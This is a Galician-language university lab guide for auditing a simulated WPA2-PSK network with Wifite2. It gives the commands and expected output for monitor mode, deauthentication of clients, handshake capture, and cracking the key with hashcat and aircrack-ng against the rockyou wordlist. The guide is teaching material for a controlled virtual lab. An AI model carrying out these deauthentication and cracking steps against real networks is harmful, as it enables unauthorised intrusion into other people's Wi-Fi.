# Guía da práctica Wifite 1.1 — Auditoría WPA2-PSK


!!! warning "**LIMITACIÓN DE RESPONSABILIDADE**" 
    O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.  
    O uso de Wifite ou calquera outra ferramenta de auditoría en redes Wi-Fi sen autorización expresa é **ILEGAL**.

## 1. Resumo

Esta práctica introduce o uso de **Wifite2** como ferramenta automatizada para auditar redes Wi-Fi WPA2-PSK nun entorno controlado de laboratorio. O escenario xa está aprovisionado por `wifilabctl`; o estudante opera directamente a ferramenta de ataque.

**Obxectivos de aprendizaxe:**  
- Empregar Wifite para automatizar captura de handshakes WPA2  
- Auditar o contrasinal capturado con wordlist rockyou  
- Comprender as limitacións e capacidades de ferramentas automatizadas  
- Contrastar co método manual [1.1-ATAQUE_WPA2_PSK.md](./1.1-ATAQUE_WPA2_PSK.md){:target="_blank"}  

---

## 2. Material necesario

**Hardware/Software:**  
- Host alumnado  
- Máquina virtual GNU/Linux Kali amd64  
- RAM ≥ 2048MB  
- CPU ≥ 2 cores  
- PAE/NX habilitado  
- ISO: Kali Live amd64  

**Ferramentas:**  
- `wifite`  
- `hostapd`  
- `wpa_supplicant`  
- `mac80211_hwsim`  
- `aircrack-ng` suite (aireplay-ng, airodump-ng)  
- `tshark` (análise de tramas)  
- `hashcat`, `pocl-opencl-icd` e `clinfo` (verificación de contrasinais coa CPU mediante OpenCL)  
- Wordlist: `/usr/share/wordlists/rockyou.txt.gz`  

**Referencias:**  
- [0] [1-Taller-HE-Practica-WiFi-1.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-1.pdf){:target="_blank"}  
- [1] [1-Taller-HE-Practica-WiFi-2.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-2.pdf){:target="_blank"}

---

## 3. Escenario e topoloxía

| Rol               | Interface | Namespace             | IP               | Estado tras `wifilabctl up` |
|-------------------|-----------|-----------------------|------------------|-----------------------------|
| AP WPA2-PSK       | `wlan0`   | `wifi_ap_wlan0`       | `192.168.10.1`   | ✅ Automático                |
| Cliente WPA2      | `wlan1`   | `wifi_cliente_wlan1`  | `192.168.10.2`   | ✅ Automático                |
| Atacante (Wifite) | `wlan2`   | (global)              | —                | ⏳ Interface libre           |
| Monitor adicional | `wlan3`   | (global)              | —                | ⏳ Interface libre           |

**SSID:** `EMPRESA-XYZ` · **Contrasinal:** `spongebob19` · **Canal:** 6

```
[wlan1: Cliente PSK]  ----wireless----> [wlan0: AP WPA2-PSK]
                                              ^
                                              |
                                    [wlan2mon: Wifite]
                                    (captura handshake → aircrack-ng)
```

---

## 4. Procedemento

**Resumo de terminais:**

| Terminal | Rol                                                |
|----------|----------------------------------------------------|
| 1        | Arrancar o escenario e verificacións               |
| 2        | Executar Wifite + cracking automático              |

---

### Terminal 1 — Arrancar o escenario


```bash
# Arrancar o escenario PSK
sudo wifilabctl up psk

# Verificar que AP e cliente están activos
sudo wifilabctl status
```

Saída esperada:
```
[*] Informe de Estado do Laboratorio
============================================================
NAMESPACE                 INTERFACE       IP                   ESTADO
---------------------------------------------------------------------------
wifi_cliente_wlan1        wlan1           192.168.10.2/24      UP
wifi_ap_wlan0             wlan0           192.168.10.1/24      UP
---------------------------------------------------------------------------
Interfaces GLOBAIS / ATACANTE:
(global)                  wlan2           (host/monitor)       LISTO
(global)                  wlan3           (host/monitor)       LISTO
```

> ⚠️ Se o cliente aínda non aparece como conectado, espera 5-10 segundos e repite `wifilabctl status`.

---

### Terminal 2 — Auditoria con Wifite

Abre unha **segunda terminal grafica como `kali`**. Nela executaras Wifite con `sudo`; manten a primeira terminal dispoñible para comprobar o estado do escenario.

### Paso 1: Preparar o dicionario de contrasinais

```bash
# Descomprimir rockyou soamente se ainda non existe en texto plano
if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
    sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
fi

# Comprobar o dicionario
ls -lh /usr/share/wordlists/rockyou.txt
```

### Comprobar que Hashcat pode utilizar OpenCL

Wifite pode empregar **Hashcat (modo 22000)** para comprobar os candidatos da lista Rockyou.
Hashcat precisa unha plataforma de cálculo OpenCL, CUDA ou HIP. Neste laboratorio
virtualizado utilizamos **PoCL**, que proporciona OpenCL sobre a CPU, sen precisar GPU.
A instalación automatizada do laboratorio xa incorpora os paquetes necesarios.

Antes de executar Wifite comproba:

```bash
clinfo -l
hashcat -I
```

Debe aparecer unha plataforma PoCL e un dispositivo de cálculo dispoñible.
Se non aparecen (por exemplo, `CL_PLATFORM_NOT_FOUND_KHR`), instala as dependencias:

```bash
sudo apt update
sudo apt install -y pocl-opencl-icd clinfo
```

Repite as dúas comprobacións. **Un erro de OpenCL non significa que o handshake sexa inválido.**

### Paso 2: Lanzar Wifite

```bash
sudo wifite --no-wps --dict /usr/share/wordlists/rockyou.txt
```

> `sudo`: Wifite necesita privilexios de administrador para xestionar a interface sen fios. Non fai falta abrir unha shell de root.  
> `--no-wps`: Omitir ataques WPS (non procede neste escenario)  
> `--dict`: Dicionario de contrasinais para comprobación offline (Wifite pode empregar Hashcat ou outras ferramentas segundo a súa configuración)

### Paso 3: Avisos de procesos en conflito (normal)

Wifite detectará os procesos do escenario (`hostapd`, `wpa_supplicant`) e avisará:

```
 [!] Conflicting processes: NetworkManager (PID 642), wpa_supplicant (PID 1919),
     hostapd (PID 2009), wpa_supplicant (PID 2024)
 [!] If you have problems: kill -9 PID or re-run wifite with --kill
```

> ⚠️ **Non matar eses procesos.** Son o AP e o cliente do escenario de laboratorio. Ignora o aviso e continúa.

### Paso 4: Seleccionar a interface de ataque

A diferenza dun sistema con tarxeta Wi-Fi física, Wifite **non selecciona automaticamente** a interface — lista `wlan2` e `wlan3` (as dúas interfaces globais do escenario) e pide escoller:

```
    Interface   PHY   Driver              Chipset
-----------------------------------------------------------------------
 1. wlan2       phy2  ??????              non-mac80211 device? (report this!)
 2. wlan3       phy3  ??????              non-mac80211 device? (report this!)
 [+] Select wireless interface (1-2): 1
```

Introducir `1` para seleccionar `wlan2` e premer Enter.

> 💡 O aviso `non-mac80211 device?` é normal con `mac80211_hwsim` en algunhas versións de Wifite. Non impide o funcionamento.

```
 [+] Enabling monitor mode on wlan2... enabled!
```

### Paso 5: Escaneo e selección do AP obxectivo

Wifite escaneará en modo monitor. Cando apareza `EMPRESA-XYZ` premer `Ctrl+C`:

```
   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT
   ---  -------------------------  ---  -----   ----   ---  ------
     1               EMPRESA-XYZ     6  WPA-P   72db    no
```

Seleccionar o AP:
```
 [+] Select target(s) (1-1) separated by commas, dashes or all: 1
```

Introducir `1` e premer Enter.

### Paso 6: Intento de captura PMKID (resultado non garantido)

Wifite intentará primeiro capturar o PMKID antes do handshake. Nesta practica a captura PMKID **non esta garantida** (ver [Práctica 1-3](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-3.pdf){:target="_blank"}). Esperar que apareza ou premer `Ctrl+C` para cancelalo e logo introducir `c` para continuar co seguinte ataque.

```
 [+] (1/1) Starting attacks against 06:FE:D8:7D:4F:43 (EMPRESA-XYZ)
 [+] EMPRESA-XYZ (72db) PMKID CAPTURE: Waiting for PMKID (4m47s) ^C
 [!] Interrupted
 [+] 1 attack(s) remain
 [+] Do you want to continue attacking, or exit (c, e)? c
```

### Paso 7: Captura do handshake WPA (segundo ataque automático)

Tras cancelar o PMKID, Wifite pasa ao ataque de captura de handshake:

```
 [+] EMPRESA-XYZ (72db) WPA Handshake capture: Waiting for target to appear..
 [+] EMPRESA-XYZ (72db) WPA Handshake capture: Listening. (clients:0, deauth:...)
```

Wifite executará internamente:  
1. `airodump-ng wlan2mon -c 6 --bssid <BSSID>` → captura en modo monitor  
2. `aireplay-ng --deauth 5 -a <BSSID_AP> -c <MAC_CLIENTE> wlan2mon` → forza reconexión  
3. Captura o handshake 4-Way cando o cliente se reconecta  

> ⚠️ Se `clients:0` persiste moito tempo, o cliente aínda non está conectado. Verificar con `sudo wifilabctl status` nunha terceira terminal e esperar que `wifi_cliente_wlan1` apareza `UP`.

Saída esperada cando captura o handshake:
```
 [+] EMPRESA-XYZ (72db) WPA Handshake capture: Captured handshake
```

### Paso 8: Comprobación automática da clave con Hashcat

```
 [+] Cracking WPA/WPA2 Handshake: Running Hashcat with rockyou.txt wordlist
 [+] Attempting to crack WPA/WPA2 hash using Hashcat mode 22000
 [+] Cracked WPA/WPA2 Handshake Key:

 [+]  Access Point Name: EMPRESA-XYZ
 [+]  Access Point BSSID: 06:FE:D8:7D:4F:43
 [+]          Encryption: WPA
 [+]      Handshake File: /root/hs/handshake_EMPRESAXYZ_06-FE-D8-7D-4F-43_*.cap
 [+]      PSK (password): spongebob19
 [+] saved crack result to cracked.json (1 total)
```

Se Hashcat verifica o candidato, a clave de proba é `spongebob19`. O resultado dependerá de que se detecte unha plataforma de cálculo e de que a captura sexa válida.

### Paso 9: Revisar ficheiros xerados

```bash
# Wifite garda ficheiros en /root/hs/
sudo ls -lh /root/hs/

# Ver resultado crackeado
sudo cat /root/cracked.json
```

---


### Se Hashcat indica que non hai dispositivo de cálculo

As mensaxes `CL_PLATFORM_NOT_FOUND_KHR` ou `No OpenCL, HIP or CUDA compatible platform found`
indican que **non existe un runtime de cálculo dispoñible**, non que o contrasinal non estea no dicionario.
Verifica `clinfo -l` e `hashcat -I` e, se falta PoCL, instálao cos comandos anteriores.
Unha vez detectado o dispositivo, repite a auditoría con Wifite.

Se xa existe unha captura, tamén podes verificar a clave coa ferramenta manual:

```bash
# Substituír o nome polo ficheiro CAP real gardado en /root/hs/
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hs/NOME-DA-CAPTURA.cap
```

### Se Wifite amosa `KEY UNKNOWN`

Que Wifite descubra `EMPRESA-XYZ` e o seu cliente **non significa** que capturase un intercambio EAPOL utilizable nin que o dicionario conseguise recuperar a PSK. O resultado `KEY UNKNOWN` pode deberse tamén a que Hashcat non dispoña de OpenCL: comproba primeiro `hashcat -I`. Non o confundas con `KEY FOUND`.

**Comprobacion 1: o cliente segue asociado ao AP?** Desde a terminal do escenario:

```bash
sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
```

**Comprobacion 2: o dicionario existe e conten a clave de proba do laboratorio?**

```bash
ls -lh /usr/share/wordlists/rockyou.txt
grep -Fx 'spongebob19' /usr/share/wordlists/rockyou.txt
```

Se `grep` non devolve nada, ese dicionario non contén a clave e non poderá recuperala, mesmo cun handshake correcto.

**Comprobacion 3: Wifite gardou unha captura?** No escenario de exemplo os ficheiros están habitualmente en `/root/hs/` porque se executou Wifite mediante `sudo`:

```bash
sudo find /root/hs -maxdepth 1 -type f -name '*.cap' -ls
```

Se existe unha captura, escolle o seu **nome exacto** e analiza o tráfico (substitúe `NOME-DA-CAPTURA.cap` polo ficheiro real):

```bash
CAP='/root/hs/NOME-DA-CAPTURA.cap'
sudo tshark -r "$CAP" -Y eapol -T fields \
  -e frame.number -e wlan.sa -e wlan.da \
  -e wlan_rsna_eapol.keydes.msgnr
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt "$CAP"
```

Se **non existe captura**, Wifite non gardou un handshake aproveitable: cómpre revisar a reconexión e o proceso de captura. Se **existen tramas EAPOL**, aínda hai que comprobar que pertencen á mesma asociación AP-cliente e que o material é suficiente para verificar unha PSK. Se `aircrack-ng` indica que non hai handshakes válidos, non se trata dun fallo do dicionario. Se detecta un handshake válido, pero non atopa a clave, revisa o dicionario e que a PSK configurada sexa a esperada.

Non utilices `wifite --kill` para tentar solucionalo: podería deter `hostapd` ou `wpa_supplicant`, que son necesarios no laboratorio. Tampouco hai que asumir que a captura PMKID funcionará neste escenario.

### Terminal 2 — Verificación manual do handshake

```bash
# Comprobar que o handshake é válido (o BSSID real verase en /root/hs/)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hs/handshake_EMPRESAXYZ_*.cap

# Extraer información EAPOL
sudo tshark -r /root/hs/handshake_EMPRESAXYZ_*.cap -Y "eapol" -V | grep -i "key"
```

Saída de aircrack-ng cando ten éxito:
```
                                 KEY FOUND! [ spongebob19 ]

      Master Key     : 00 35 42 60 BF F4 F0 DC 57 FA 6D 2C FF 97 F0 34
                       A2 F0 A5 7F EA 29 83 79 19 35 57 80 1A 63 40 EF
      Transient Key  : 84 79 3D 95 50 43 3E 7E F4 7B 41 6F 33 E6 DE 26
                       69 3B 4A AF 14 93 30 0A 01 AB 9D 44 1C 6E CE A3
                       C2 5E 18 FE F1 43 A4 2F 54 CE 7A B8 E2 FF 69 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
      EAPOL HMAC     : 08 0F C2 1D 29 48 2A AE B3 66 CF 49 88 6A 04 C3
```

---

## 5. Limitacións de Wifite e alternativa didáctica

**Wifite2 é unha ferramenta AUTOMATIZADA** que simplifica moitos pasos, pero ten limitacións:

1. **Deautenticación pode fallar** se o cliente non reacciona aos paquetes deauth (timing, PMF, ou configuración de mac80211_hwsim).
2. **Non ofrece control fino** sobre parámetros de captura (canal, tempo de espera, número de deauth).
3. **Wordlist por defecto** pode non estar optimizada para este escenario.


---

## 6. Limpeza do laboratorio

**Terminal 1:**

```bash
# Deter e eliminar o escenario completamente
sudo wifilabctl reset

# Verificar que non quedan namespaces
ip netns list
```

**Terminal 2** (se wlan2 quedou en modo monitor):

```bash
sudo airmon-ng stop wlan2mon
```
